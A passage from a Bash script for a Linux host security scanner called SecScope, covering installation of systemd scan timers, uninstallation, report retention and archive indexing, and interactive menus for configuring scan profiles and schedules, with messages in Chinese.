        install -m 0500 "${PROGRAM_DIR}/native/secscope-cache/cache-client" /opt/secscope/native/secscope-cache/cache-client || return 1
        [ ! -L /etc/systemd/system/secscope-cache.service ] || { log_error '拒绝覆盖符号链接 cache service'; return 1; }
        install -m 0644 "${PROGRAM_DIR}/systemd/secscope-cache.service" /etc/systemd/system/secscope-cache.service || return 1
    fi
    [ ! -L "$config_file" ] || { log_error "拒绝使用符号链接配置文件: $config_file"; return 1; }
    if [ ! -f "$config_file" ]; then
        printf '%s\n' \
            'SECSCOPE_RETENTION_DAYS=-1' \
            'SECSCOPE_HIGH_RETENTION_DAYS=-1' \
            'SECSCOPE_RESOLVE_AFTER_MISSES=3' \
            'SECSCOPE_HOST_ROLE=auto' \
            'SECSCOPE_MODE=Hunt' \
            'SECSCOPE_PROFILE=daily-hunt' \
            'SECSCOPE_NATIVE_SCANNER=on' \
            'SECSCOPE_NATIVE_WORKERS=4' \
            'SECSCOPE_NATIVE_MAX_MEMORY_MB=256' \
            'SECSCOPE_NATIVE_MAX_LOAD_FACTOR=1.5' \
            'SECSCOPE_NATIVE_STAGE_TIMEOUT=120' \
            'SECSCOPE_NATIVE_RUNTIME_TIMEOUT=120' \
            'SECSCOPE_FAST_ENABLED=true' \
            'SECSCOPE_FAST_INTERVAL=30min' \
            'SECSCOPE_DAILY_ENABLED=true' \
            'SECSCOPE_DAILY_INTERVAL=2h' \
            'SECSCOPE_FULL_ENABLED=true' \
            'SECSCOPE_FULL_INTERVAL=1d' \
            'SECSCOPE_FIRST_RUN_PROFILE=none' \
            'SECSCOPE_SCHEDULE_MODE=interval' \
            'SECSCOPE_SCHEDULE_TIME=02:00' \
            'SECSCOPE_SCHEDULE_CRON=0 2 * * *' > "$config_file"
        printf '%s\n' \
            'SECSCOPE_AUTH_BEHAVIOR_ENABLED=true' \
            'SECSCOPE_AUTH_MAX_EVENTS=200' \
            'SECSCOPE_EVENT_WINDOW_MINUTES=40' \
            'SECSCOPE_WEB_ACCESS_LOG_MAX_LINES=5000' \
            'SECSCOPE_WEB_ACCESS_LOG_FORMAT=auto' \
            'SECSCOPE_YARA_MODE=auto' \
            'SECSCOPE_YARA_RULES=/opt/secscope/rules/yara-forge-core-20260809' \
            'SECSCOPE_MAINTENANCE_WINDOWS=' \
            'SECSCOPE_CONTEXT_ALLOW_FILE=/etc/secscope/context.allow' >> "$config_file"
    fi
    chmod 0600 "$config_file"
    [ -n "$(read_config_value "$config_file" SECSCOPE_YARA_RULES)" ] || \
        set_config_value "$config_file" SECSCOPE_YARA_RULES /opt/secscope/rules/yara-forge-core-20260809

    if [ "$SCHEDULE_CONFIG_EXPLICIT" = true ]; then
        schedule_mode="$SCHEDULE_MODE"
        schedule_time="$SCHEDULE_TIME"
        schedule_cron="$SCHEDULE_CRON"
        case "$schedule_mode" in interval|daily|cron) ;; *) log_error "无效调度模式: $schedule_mode"; return 2 ;; esac
        if [ "$schedule_mode" = daily ] && ! valid_schedule_time "$schedule_time"; then
            log_error "无效每日执行时间: $schedule_time"
            return 2
        fi
        if [ "$schedule_mode" = cron ]; then
            normalize_cron_expression "$schedule_cron" || {
                log_error "无效 cron 表达式: $schedule_cron"
                return 2
            }
            schedule_cron="$NORMALIZED_CRON"
        fi
        set_config_value "$config_file" SECSCOPE_SCHEDULE_MODE "$schedule_mode" || return 1
        set_config_value "$config_file" SECSCOPE_SCHEDULE_TIME "$schedule_time" || return 1
        set_config_value "$config_file" SECSCOPE_SCHEDULE_CRON "$schedule_cron" || return 1
    else
        schedule_mode=$(read_config_value "$config_file" SECSCOPE_SCHEDULE_MODE)
        schedule_time=$(read_config_value "$config_file" SECSCOPE_SCHEDULE_TIME)
        schedule_cron=$(read_config_value "$config_file" SECSCOPE_SCHEDULE_CRON)
        [ -n "$schedule_mode" ] || schedule_mode=interval
        [ -n "$schedule_time" ] || schedule_time=02:00
        [ -n "$schedule_cron" ] || schedule_cron='0 2 * * *'
    fi
    case "$schedule_mode" in
        interval) ;;
        daily) valid_schedule_time "$schedule_time" || { log_error "配置中的每日执行时间无效: $schedule_time"; return 2; } ;;
        cron) normalize_cron_expression "$schedule_cron" || { log_error "配置中的 cron 表达式无效: $schedule_cron"; return 2; }; schedule_cron="$NORMALIZED_CRON" ;;
        *) log_error "配置中的调度模式无效: $schedule_mode"; return 2 ;;
    esac
    for f in process.allow path.allow ip.allow port.allow; do
        [ -f "/etc/secscope/$f" ] || printf '# value|expires(YYYY-MM-DD)|owner|note\n' > "/etc/secscope/$f"
        chmod 0600 "/etc/secscope/$f"
    done
    if [ ! -f /etc/secscope/context.allow ]; then
        printf '%s\n' '# path_glob|user|parent|args_regex|target_glob|owner|expires(YYYY-MM-DD)|note' > /etc/secscope/context.allow
        chmod 0600 /etc/secscope/context.allow
    fi
    if [ ! -f /etc/secscope/file-scan.config ]; then
        if [ -r "${PROGRAM_DIR}/config/examples/file-scan.config.example" ]; then
            install -m 0600 "${PROGRAM_DIR}/config/examples/file-scan.config.example" /etc/secscope/file-scan.config
        else
            printf '%s\n' '# 数值预算默认由 --profile 设置；取消注释可覆盖' '# MaxFiles=3000' '# MaxDepth=5' '# MaxHashMB=100' '# TimeoutSeconds=120' '# RecentDays=7' '# SmallFilePriorityKB=300' > /etc/secscope/file-scan.config
            chmod 0600 /etc/secscope/file-scan.config
        fi
    fi
    set_config_value "$config_file" SECSCOPE_FAST_ENABLED "$(read_config_value "$config_file" SECSCOPE_FAST_ENABLED)" 2>/dev/null || true
    [ -n "$(read_config_value "$config_file" SECSCOPE_FAST_ENABLED)" ] || set_config_value "$config_file" SECSCOPE_FAST_ENABLED true
    [ -n "$(read_config_value "$config_file" SECSCOPE_FAST_INTERVAL)" ] || set_config_value "$config_file" SECSCOPE_FAST_INTERVAL 30min
    [ -n "$(read_config_value "$config_file" SECSCOPE_DAILY_ENABLED)" ] || set_config_value "$config_file" SECSCOPE_DAILY_ENABLED true
    [ -n "$(read_config_value "$config_file" SECSCOPE_DAILY_INTERVAL)" ] || set_config_value "$config_file" SECSCOPE_DAILY_INTERVAL 2h
    [ -n "$(read_config_value "$config_file" SECSCOPE_FULL_ENABLED)" ] || set_config_value "$config_file" SECSCOPE_FULL_ENABLED true
    [ -n "$(read_config_value "$config_file" SECSCOPE_FULL_INTERVAL)" ] || set_config_value "$config_file" SECSCOPE_FULL_INTERVAL 1d
    [ -n "$(read_config_value "$config_file" SECSCOPE_FIRST_RUN_PROFILE)" ] || set_config_value "$config_file" SECSCOPE_FIRST_RUN_PROFILE none
    if [ "$PROFILE_SCHEDULE_EXPLICIT" = true ]; then
        set_config_value "$config_file" SECSCOPE_FAST_ENABLED "$FAST_ENABLED" || return 1
        set_config_value "$config_file" SECSCOPE_FAST_INTERVAL "$FAST_INTERVAL" || return 1
        set_config_value "$config_file" SECSCOPE_DAILY_ENABLED "$DAILY_ENABLED" || return 1
        set_config_value "$config_file" SECSCOPE_DAILY_INTERVAL "$DAILY_INTERVAL" || return 1
        set_config_value "$config_file" SECSCOPE_FULL_ENABLED "$FULL_ENABLED" || return 1
        set_config_value "$config_file" SECSCOPE_FULL_INTERVAL "$FULL_INTERVAL" || return 1
    fi
    FAST_ENABLED=$(read_config_value "$config_file" SECSCOPE_FAST_ENABLED); FAST_INTERVAL=$(read_config_value "$config_file" SECSCOPE_FAST_INTERVAL)
    DAILY_ENABLED=$(read_config_value "$config_file" SECSCOPE_DAILY_ENABLED); DAILY_INTERVAL=$(read_config_value "$config_file" SECSCOPE_DAILY_INTERVAL)
    FULL_ENABLED=$(read_config_value "$config_file" SECSCOPE_FULL_ENABLED); FULL_INTERVAL=$(read_config_value "$config_file" SECSCOPE_FULL_INTERVAL)
    if [ "$FIRST_RUN_EXPLICIT" = true ]; then
        set_config_value "$config_file" SECSCOPE_FIRST_RUN_PROFILE "$FIRST_RUN_PROFILE" || return 1
    else
        FIRST_RUN_PROFILE=$(read_config_value "$config_file" SECSCOPE_FIRST_RUN_PROFILE)
    fi
    case "$FIRST_RUN_PROFILE" in fast|fast-hunt) FIRST_RUN_PROFILE=fast-hunt ;; daily|daily-hunt) FIRST_RUN_PROFILE=daily-hunt ;; full|none) ;; *) log_error 'SECSCOPE_FIRST_RUN_PROFILE 必须为 fast、daily、full 或 none'; return 2 ;; esac
    case "$FIRST_RUN_PROFILE" in
        fast-hunt) [ "$FAST_ENABLED" = true ] || { log_error '首次执行 fast-hunt 但 fast timer 已禁用'; return 2; } ;;
        daily-hunt) [ "$DAILY_ENABLED" = true ] || { log_error '首次执行 daily-hunt 但 daily timer 已禁用'; return 2; } ;;
        full) [ "$FULL_ENABLED" = true ] || { log_error '首次执行 full 但 full timer 已禁用'; return 2; } ;;
    esac
    valid_schedule_interval "$FAST_INTERVAL" && valid_schedule_interval "$DAILY_INTERVAL" && valid_schedule_interval "$FULL_INTERVAL" || { log_error '分层调度间隔必须为 10min、30min、1h、2h、6h、12h、1d 或 7d 这类 systemd 单位'; return 2; }
    cat > /etc/systemd/system/secscope@.service <<'UNIT'
[Unit]
Description=SecScope layered scan (%i)
After=local-fs.target

[Service]
Type=oneshot
EnvironmentFile=-/etc/secscope/secscope.conf
ExecStart=/bin/bash /opt/secscope/secscope.sh --scheduled --profile %i
UMask=0077
Nice=10
IOSchedulingClass=idle
TimeoutStartSec=3h
NoNewPrivileges=true
ProtectSystem=full
ProtectHome=read-only
PrivateTmp=false
UNIT
    cat > /etc/systemd/system/secscope.service <<'UNIT'
[Unit]
Description=SecScope legacy compatibility service
After=local-fs.target

[Service]
Type=oneshot
EnvironmentFile=-/etc/secscope/secscope.conf
ExecStart=/bin/bash /opt/secscope/secscope.sh --scheduled --profile daily-hunt
UMask=0077
Nice=10
IOSchedulingClass=idle
TimeoutStartSec=19min
NoNewPrivileges=true
ProtectSystem=full
ProtectHome=read-only
PrivateTmp=false
UNIT
    if [ "$schedule_mode" = cron ]; then
        systemctl disable --now secscope-fast.timer secscope-daily.timer secscope-full.timer 2>/dev/null || true
        rm -f /etc/systemd/system/secscope-fast.timer /etc/systemd/system/secscope-daily.timer /etc/systemd/system/secscope-full.timer
        write_cron_file "$cron_file" "$schedule_cron" || {
            log_error "无法写入 cron 定时配置: $cron_file"
            return 1
        }
    else
        rm -f "$cron_file"
        write_profile_timer_unit /etc/systemd/system/secscope-fast.timer fast-hunt "$FAST_INTERVAL" "$FIRST_RUN_PROFILE" || return 1
        write_profile_timer_unit /etc/systemd/system/secscope-daily.timer daily-hunt "$DAILY_INTERVAL" "$FIRST_RUN_PROFILE" || return 1
        write_profile_timer_unit /etc/systemd/system/secscope-full.timer full "$FULL_INTERVAL" "$FIRST_RUN_PROFILE" || return 1
        chmod 0644 /etc/systemd/system/secscope-fast.timer /etc/systemd/system/secscope-daily.timer /etc/systemd/system/secscope-full.timer
    fi
    chmod 0644 /etc/systemd/system/secscope.service /etc/systemd/system/secscope@.service
    [ ! -f /etc/systemd/system/secscope-cache.service ] || systemctl enable --now secscope-cache.service 2>/dev/null || log_warn 'cache daemon 未启动，native 将直接采集'
    systemctl daemon-reload
    if [ "$schedule_mode" = cron ]; then
        log_info "SecScope 已安装，使用 cron 表达式 ${schedule_cron} 执行"
        log_info "cron 配置文件: ${cron_file}"
    else
        for timer in fast daily full; do systemctl disable --now "secscope-${timer}.timer" 2>/dev/null || true; done
        [ "$FAST_ENABLED" = true ] && systemctl enable --now secscope-fast.timer
        [ "$DAILY_ENABLED" = true ] && systemctl enable --now secscope-daily.timer
        [ "$FULL_ENABLED" = true ] && systemctl enable --now secscope-full.timer
        log_info "SecScope 分层调度已安装：fast=${FAST_ENABLED}/${FAST_INTERVAL}, daily=${DAILY_ENABLED}/${DAILY_INTERVAL}, full=${FULL_ENABLED}/${FULL_INTERVAL}; 首次执行=${FIRST_RUN_PROFILE}"
        systemctl list-timers 'secscope-*.timer' --no-pager 2>/dev/null | head -15
    fi
}

uninstall_secscope() {
    [ "$(id -u)" -eq 0 ] || { log_error "卸载需要 root 权限"; return 1; }
    systemctl disable --now secscope.timer secscope-fast.timer secscope-daily.timer secscope-full.timer secscope-cache.service 2>/dev/null || true
    rm -f /etc/systemd/system/secscope.timer /etc/systemd/system/secscope-fast.timer /etc/systemd/system/secscope-daily.timer /etc/systemd/system/secscope-full.timer /etc/systemd/system/secscope.service /etc/systemd/system/secscope@.service /etc/systemd/system/secscope-cache.service /etc/cron.d/secscope
    systemctl daemon-reload 2>/dev/null || true
    # 报告默认保存在程序目录，卸载时仅删除程序文件，保留 HTML 报告。
    rm -f /opt/secscope/secscope.sh /opt/secscope/secscope.sh.sha256 /opt/secscope/scanner /opt/secscope/cache-daemon /opt/secscope/cache-client /opt/secscope/native/secscope-scanner/scanner /opt/secscope/native/secscope-cache/cache-daemon /opt/secscope/native/secscope-cache/cache-client /opt/secscope/modules/profile.sh /opt/secscope/modules/yara.sh /opt/secscope/helpers/yara_normalizer.py /opt/secscope/helpers/yara_promoter.py /opt/secscope/helpers/rat_engine.py /opt/secscope/helpers/threat_intel.py /opt/secscope/helpers/corpus_manifest.py /opt/secscope/helpers/route_static_candidates.py /opt/secscope/helpers/java/SecScopeRuntimeInspector.java /opt/secscope/helpers/java/README.md /opt/secscope/rules/ioc-local.txt /opt/secscope/rules/ioc-allow.txt /opt/secscope/rules/yara-forge-core-20260809/yara-rules-core.yar /opt/secscope/runtime/linux-amd64/bin/yr /opt/secscope/runtime/linux-arm64/bin/yr
    rmdir /opt/secscope/native/secscope-scanner /opt/secscope/native/secscope-cache /opt/secscope/native /opt/secscope/modules /opt/secscope/helpers/java /opt/secscope/helpers /opt/secscope/rules/yara-forge-core-20260809 /opt/secscope/rules /opt/secscope/runtime/linux-amd64/bin /opt/secscope/runtime/linux-amd64 /opt/secscope/runtime/linux-arm64/bin /opt/secscope/runtime/linux-arm64 /opt/secscope/runtime 2>/dev/null || true
    rmdir /opt/secscope 2>/dev/null || true
    log_info "SecScope 程序已卸载；HTML 报告、状态和配置已保留"
}

apply_retention() {
    [ -d "$REPORT_ROOT" ] || return 0
    [ "$RETENTION_DAYS" -ge 0 ] || return 0
    [ "$REPORT_ROOT" != "/" ] && [ -f "$REPORT_ROOT/.secscope-report-root" ] || {
        log_warn "报告目录不符合安全约束，跳过清理: $REPORT_ROOT"
        return 0
    }
    local dir status critical high keep_high
    while IFS= read -r dir; do
        [ "$dir" != "$OUTPUT_DIR" ] || continue
        keep_high=false; status="$dir/status.json"; critical=0; high=0
        if [ -r "$status" ]; then
            critical=$(sed -nE 's/.*"threat_severity"[^\n]*"CRITICAL":([0-9]+).*/\1/p' "$status" | head -1); critical="${critical:-0}"
            high=$(sed -nE 's/.*"threat_severity"[^\n]*"HIGH":([0-9]+).*/\1/p' "$status" | head -1); high="${high:-0}"
            [ "$critical" -gt 0 ] || [ "$high" -gt 0 ] || keep_high=false
            if [ "$critical" -gt 0 ] || [ "$high" -gt 0 ]; then
                if [ "$HIGH_RETENTION_DAYS" -lt 0 ] || ! find "$dir" -maxdepth 0 -mtime "+$HIGH_RETENTION_DAYS" -print -quit 2>/dev/null | grep -q .; then
                    keep_high=true
                fi
            fi
        fi
        [ "$keep_high" = true ] && continue
        rm -rf -- "$dir"
    done < <(find "$REPORT_ROOT" -mindepth 1 -maxdepth 1 -type d -name '????????_??????_*' -mtime "+$RETENTION_DAYS" -print 2>/dev/null)
}

update_report_archive_index() {
    [ -d "$REPORT_ROOT" ] || return 0
    [ "$REPORT_ROOT" != "/" ] && [ -f "$REPORT_ROOT/.secscope-report-root" ] || return 1
    local rows="" dir status report host started verdict coverage ips rel temp index_file
    while IFS= read -r dir; do
        report=$(find "$dir" -maxdepth 1 -type f -name 'report_*.html' -print -quit 2>/dev/null)
        [ -n "$report" ] || continue
        status="$dir/status.json"; host=$(basename "$dir"); started=""; verdict="状态摘要不可用"; coverage=""; ips=""
        if [ -r "$status" ]; then
            host=$(sed -nE 's/.*"hostname": *"([^"]*)".*/\1/p' "$status" | head -1); host="${host:-$(basename "$dir")}"
            started=$(sed -nE 's/.*"started_at": *"([^"]*)".*/\1/p' "$status" | head -1)
            verdict=$(sed -nE 's/.*"verdict": *"([^"]*)".*/\1/p' "$status" | head -1); verdict="${verdict:-状态摘要不可用}"
            coverage=$(sed -nE 's/.*"coverage_percent": *([0-9]+).*/\1/p' "$status" | head -1); [ -z "$coverage" ] || coverage="${coverage}%"
            ips=$(sed -nE 's/.*"local_addresses": *\[([^]]*)\].*/\1/p' "$status" | head -1 | tr -d '"' | sed 's/,/, /g')
        fi
        [ -n "$started" ] || started=$(basename "$dir" | sed -E 's/^([0-9]{8})_([0-9]{6}).*/\1 \2/')
        rel="$(basename "$dir")/$(basename "$report")"
        rows+="$(printf '<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td><a href="%s">打开报告</a></td></tr>' \
            "$(html_esc "$started")" "$(html_esc "$host")" "$(html_esc "$ips")" "$(html_esc "$verdict")" "$(html_esc "$coverage")" "$(html_esc "$rel")")"
    done < <(find "$REPORT_ROOT" -mindepth 1 -maxdepth 1 -type d -name '????????_??????_*' -print 2>/dev/null | LC_ALL=C sort -r)
    [ -n "$rows" ] || rows='<tr><td colspan="6" class="empty">暂无已归档报告</td></tr>'
    index_file="$REPORT_ROOT/index.html"; temp="$REPORT_ROOT/.index.html.tmp.$$"
    cat > "$temp" <<'INDEX'
<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SecScope Linux 报告归档</title><style>*{box-sizing:border-box}body{margin:0;background:#f3f5f7;color:#263238;font:14px -apple-system,BlinkMacSystemFont,"Segoe UI","Microsoft YaHei",sans-serif}.top{background:#202733;color:#fff;padding:20px 28px}.top h1{font-size:20px;margin:0 0 6px}.top p{margin:0;color:#b8c2cc}.wrap{max-width:1280px;margin:auto;padding:20px}.search{width:100%;padding:9px 11px;border:1px solid #cfd6dc;border-radius:4px;margin-bottom:12px}.table{width:100%;border-collapse:collapse;background:#fff}.table th,.table td{padding:10px 11px;border-bottom:1px solid #edf0f2;text-align:left}.table th{background:#f7f9fa;color:#5d6870}.table a{color:#2478a8}.empty{text-align:center;color:#87939c;padding:24px!important}@media(max-width:760px){.wrap{padding:12px}.table{display:block;overflow-x:auto}}</style></head><body><header class="top"><h1>SecScope Linux 报告归档</h1><p>每次巡检报告独立保存，按时间倒序排列。</p></header><main class="wrap"><input id="archive-search" class="search" type="search" autocomplete="off" placeholder="搜索时间、主机、IP 或结论"><table class="table"><thead><tr><th>巡检时间</th><th>主机</th><th>本机 IP</th><th>结论</th><th>覆盖率</th><th>报告</th></tr></thead><tbody>ARCHIVE_ROWS</tbody></table></main><script>(function(){var q=document.getElementById('archive-search'),rows=document.querySelectorAll('tbody tr');q.oninput=function(){var value=(q.value||'').toLowerCase();for(var i=0;i<rows.length;i++){var text=(rows[i].textContent||rows[i].innerText||'').toLowerCase();rows[i].style.display=text.indexOf(value)>=0?'':'none'}}})();</script></body></html>
INDEX
    replace_html_tokens "$temp" 'ARCHIVE_ROWS' "$rows" || { rm -f "$temp"; return 1; }
    chmod 600 "$temp" && mv "$temp" "$index_file"
}

enforce_offline_network_policy() {
    # 保留旧配置键的解析兼容性，但任何值都不会触发出站请求。
    [ -z "$WEBHOOK_URL" ] || log_warn 'SECSCOPE_WEBHOOK_URL 已被忽略：SecScope 为永久离线模式（OUTBOUND_DISABLED_BY_DESIGN）'
    return 0
}

#==============================================================================
# 清理
#==============================================================================

cleanup() {
    [ -z "$PACKAGE_VERIFY_CACHE_FILE" ] || rm -f -- "$PACKAGE_VERIFY_CACHE_FILE" 2>/dev/null || true
    if [ -f "${LOCK_FILE}.profile" ] && grep -q "^pid=$$" "${LOCK_FILE}.profile" 2>/dev/null; then rm -f "${LOCK_FILE}.profile"; fi
    if [ "$LOCK_METHOD" = "mkdir" ] && [ -n "$LOCK_FILE" ]; then
        rm -f -- "${LOCK_FILE}.d/pid" 2>/dev/null || true
        rm -f -- "${LOCK_FILE}.d/profile" 2>/dev/null || true
        rmdir "${LOCK_FILE}.d" 2>/dev/null || true
    fi
    panel_finish
    if [ "$INTERACTIVE_TTY_ACTIVE" = true ] && [ -n "$INTERACTIVE_TTY_STATE" ]; then
        stty "$INTERACTIVE_TTY_STATE" 2>/dev/null || true
        INTERACTIVE_TTY_ACTIVE=false
        INTERACTIVE_TTY_STATE=""
    fi
    # 仅交互终端需要恢复颜色和光标，日志输出不能包含 ANSI。
    if [ -t 1 ]; then printf '%b\033[0m\033[?25h' "${NC}"; fi
}

trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM
trap 'exit 129' HUP

#==============================================================================
# 主入口
#==============================================================================

valid_schedule_time() {
    local value="$1" hour minute
    [[ "$value" =~ ^[0-9]{2}:[0-9]{2}$ ]] || return 1
    hour=$((10#${value%:*})); minute=$((10#${value#*:}))
    [ "$hour" -le 23 ] && [ "$minute" -le 59 ]
}

read_config_value() {
    local file="$1" key="$2"
    [ -r "$file" ] || return 0
    awk -F= -v key="$key" '{name=$1; gsub(/^[[:space:]]+|[[:space:]]+$/, "", name)} name==key {value=substr($0,index($0,"=")+1); sub(/^[[:space:]]+/, "", value); sub(/[[:space:]]+$/, "", value); gsub(/^"|"$/, "", value); print value; exit}' "$file"
}

set_config_value() {
    local file="$1" key="$2" value="$3" next found
    next=$(mktemp "${file}.tmp.XXXXXX") || return 1
    awk -v key="$key" -v value="$value" '
        BEGIN { found=0 }
        $0 ~ "^[[:space:]]*" key "[[:space:]]*=" { print key "=" value; found=1; next }
        { print }
        END { if (!found) print key "=" value }
    ' "$file" > "$next" || { rm -f "$next"; return 1; }
    chmod 600 "$next" && mv "$next" "$file"
}

interactive_menu() {
    local title="$1" key sequence selected=0 idx option marker
    shift
    local -a options=("$@")
    [ -t 0 ] && [ -t 1 ] || return 2
    [ "${#options[@]}" -gt 0 ] || return 2
    INTERACTIVE_MENU_RESULT=-1
    INTERACTIVE_TTY_STATE=$(stty -g 2>/dev/null) || return 2
    stty -icanon -echo 2>/dev/null || { INTERACTIVE_TTY_STATE=""; return 2; }
    INTERACTIVE_TTY_ACTIVE=true
    while true; do
        printf '\033[2J\033[H%s\n\n' "$title"
        for idx in "${!options[@]}"; do
            option="${options[$idx]}"; marker='  '
            [ "$idx" -eq "$selected" ] && marker='> '
            printf '%s%s\n' "$marker" "$option"
        done
        printf '\n使用上下键选择，回车确认，Esc 返回\n'
        key=''; IFS= read -r -s -n 1 key || key=''
        case "$key" in
            ''|$'\n'|$'\r')
                INTERACTIVE_MENU_RESULT="$selected"
                stty "$INTERACTIVE_TTY_STATE" 2>/dev/null || true
                INTERACTIVE_TTY_ACTIVE=false; INTERACTIVE_TTY_STATE=""
                printf '\033[2J\033[H'; return 0
                ;;
            $'\x1b')
                sequence=''; IFS= read -r -s -n 1 -t 1 sequence || sequence=''
                if [ "$sequence" = '[' ]; then
                    IFS= read -r -s -n 1 -t 1 sequence || sequence=''
                    case "$sequence" in
                        A) selected=$((selected - 1)); [ "$selected" -lt 0 ] && selected=$((${#options[@]} - 1)) ;;
                        B) selected=$((selected + 1)); [ "$selected" -ge "${#options[@]}" ] && selected=0 ;;
                    esac
                else
                    stty "$INTERACTIVE_TTY_STATE" 2>/dev/null || true
                    INTERACTIVE_TTY_ACTIVE=false; INTERACTIVE_TTY_STATE=""
                    printf '\033[2J\033[H'; return 1
                fi
                ;;
            k|K) selected=$((selected - 1)); [ "$selected" -lt 0 ] && selected=$((${#options[@]} - 1)) ;;
            j|J) selected=$((selected + 1)); [ "$selected" -ge "${#options[@]}" ] && selected=0 ;;
            q|Q)
                stty "$INTERACTIVE_TTY_STATE" 2>/dev/null || true
                INTERACTIVE_TTY_ACTIVE=false; INTERACTIVE_TTY_STATE=""
                printf '\033[2J\033[H'; return 1
                ;;
        esac
    done
}

interactive_pause() {
    local state key
    [ -t 0 ] && [ -t 1 ] || return 0
    state=$(stty -g 2>/dev/null) || return 0
    stty -icanon -echo 2>/dev/null || return 0
    printf '\n按任意键返回...'; IFS= read -r -s -n 1 key || true
    stty "$state" 2>/dev/null || true; printf '\n'
}

interactive_scan_wizard() {
    local choice state_choice report_choice
    interactive_menu '开始扫描：选择巡检档位' \
        "使用当前档位（${SCAN_PROFILE}）" \
        '快速巡检（fast-hunt）：低资源、快速发现变化' \
        '日常巡检（daily-hunt）：推荐，覆盖与速度平衡' \
        '完整巡检（full）：覆盖全部模块，耗时较长' \
        '返回' || return 1
    choice=$INTERACTIVE_MENU_RESULT
    case "$choice" in 0) : ;; 1) SCAN_PROFILE=fast-hunt ;; 2) SCAN_PROFILE=daily-hunt ;; 3) SCAN_PROFILE=full ;; 4) return 1 ;; esac
    PROFILE_EXPLICIT=true
    interactive_menu '选择主机角色' \
        "使用当前角色（${HOST_ROLE}）" \
        '自动识别（推荐）' '通用服务器' 'Web 服务器' '数据库服务器' '文件服务器' \
        '开发/构建服务器' 'Kubernetes/容器主机' '堡垒机' || return 1
    choice=$INTERACTIVE_MENU_RESULT
    case "$choice" in
        0) : ;; 1) HOST_ROLE=auto ;; 2) HOST_ROLE=generic ;; 3) HOST_ROLE=web-server ;;
        4) HOST_ROLE=database-server ;; 5) HOST_ROLE=file-server ;; 6) HOST_ROLE=dev ;;
        7) HOST_ROLE=kubernetes ;; 8) HOST_ROLE=bastion ;;
    esac
    interactive_menu '选择跨轮状态策略' \
        '使用跨轮状态（推荐）' '把当前状态初始化为基线' '备份并重建状态基线' \
        '本次扫描不使用跨轮状态' || return 1
    state_choice=$INTERACTIVE_MENU_RESULT
    INIT_STATE=false; RESET_STATE=false; STATE_ENABLED=true
    case "$state_choice" in 1) INIT_STATE=true ;; 2) RESET_STATE=true ;; 3) STATE_ENABLED=false ;; esac
    interactive_menu '选择报告输出' \
        '标准报告（推荐，敏感正文自动脱敏）' '标准报告 + 归档证据包' \
        '标准报告 + 脱敏分享包' '归档证据包 + 脱敏分享包' \
        '包含敏感正文（仅限受控环境）' || return 1
    report_choice=$INTERACTIVE_MENU_RESULT
    CREATE_ARCHIVE=false; SHARE_PACKAGE=false; INCLUDE_SENSITIVE=false
    case "$report_choice" in
        1) CREATE_ARCHIVE=true ;; 2) SHARE_PACKAGE=true ;; 3) CREATE_ARCHIVE=true; SHARE_PACKAGE=true ;;
        4) INCLUDE_SENSITIVE=true ;;
    esac
    interactive_menu "确认扫描：${SCAN_PROFILE} / ${HOST_ROLE}" '开始扫描' '返回修改' || return 1
    [ "$INTERACTIVE_MENU_RESULT" -eq 0 ]
}

interactive_install_wizard() {
    local strategy enable_choice first_choice profile interval_choice interval
    interactive_menu '安装定时巡检：选择调度策略' \
        '推荐策略：fast 30 分钟、daily 2 小时、full 1 天' \
        '快速策略：fast 10 分钟、daily 1 小时、full 1 天' \
        '轻量策略：fast 1 小时、daily 6 小时、full 7 天' \
        '自定义策略：选择启用任务和间隔' || return 1
    strategy=$INTERACTIVE_MENU_RESULT
    case "$strategy" in
        0) FAST_INTERVAL=30min; DAILY_INTERVAL=2h; FULL_INTERVAL=1d ;;
        1) FAST_INTERVAL=10min; DAILY_INTERVAL=1h; FULL_INTERVAL=1d ;;
        2) FAST_INTERVAL=1h; DAILY_INTERVAL=6h; FULL_INTERVAL=7d ;;
        3)
            interactive_menu '选择启用的定时任务' '全部启用（推荐）' '仅快速巡检' '快速 + 日常巡检' \
                '仅日常巡检' '仅完整巡检' '关闭全部任务' || return 1
            enable_choice=$INTERACTIVE_MENU_RESULT
            FAST_ENABLED=false; DAILY_ENABLED=false; FULL_ENABLED=false
            case "$enable_choice" in
                0) FAST_ENABLED=true; DAILY_ENABLED=true; FULL_ENABLED=true ;; 1) FAST_ENABLED=true ;;
                2) FAST_ENABLED=true; DAILY_ENABLED=true ;; 3) DAILY_ENABLED=true ;; 4) FULL_ENABLED=true ;;
            esac
            for profile in fast daily full; do
                case "$profile" in fast) [ "$FAST_ENABLED" = true ] || continue ;; daily) [ "$DAILY_ENABLED" = true ] || continue ;; full) [ "$FULL_ENABLED" = true ] || continue ;; esac
                interactive_menu "选择 ${profile} 巡检间隔" '10 分钟' '30 分钟' '1 小时' '2 小时' '6 小时' '12 小时' '1 天' '7 天' || return 1
                interval_choice=$INTERACTIVE_MENU_RESULT
                case "$interval_choice" in 0) interval=10min ;; 1) interval=30min ;; 2) interval=1h ;; 3) interval=2h ;; 4) interval=6h ;; 5) interval=12h ;; 6) interval=1d ;; 7) interval=7d ;; esac
                case "$profile" in fast) FAST_INTERVAL="$interval" ;; daily) DAILY_INTERVAL="$interval" ;; full) FULL_INTERVAL="$interval" ;; esac
            done
            ;;
    esac
    if [ "$strategy" -ne 3 ]; then
        interactive_menu '选择启用的定时任务' '全部启用（推荐）' '仅快速巡检' '快速 + 日常巡检' \
            '仅日常巡检' '仅完整巡检' '关闭全部任务' || return 1
        enable_choice=$INTERACTIVE_MENU_RESULT
        FAST_ENABLED=false; DAILY_ENABLED=false; FULL_ENABLED=false
        case "$enable_choice" in
            0) FAST_ENABLED=true; DAILY_ENABLED=true; FULL_ENABLED=true ;; 1) FAST_ENABLED=true ;;
            2) FAST_ENABLED=true; DAILY_ENABLED=true ;; 3) DAILY_ENABLED=true ;; 4) FULL_ENABLED=true ;;
        esac
    fi
    [ "$FAST_ENABLED" = true ] || [ "$DAILY_ENABLED" = true ] || [ "$FULL_ENABLED" = true ] || { log_warn '至少需要启用一个定时任务'; return 1; }
    interactive_menu '选择首次执行策略（避免三个 timer 同时触发）' \
        '不立即执行，按各自间隔开始' '首次执行快速巡检' '首次执行日常巡检' '首次执行完整巡检' || return 1
    first_choice=$INTERACTIVE_MENU_RESULT; FIRST_RUN_PROFILE=none
    case "$first_choice" in
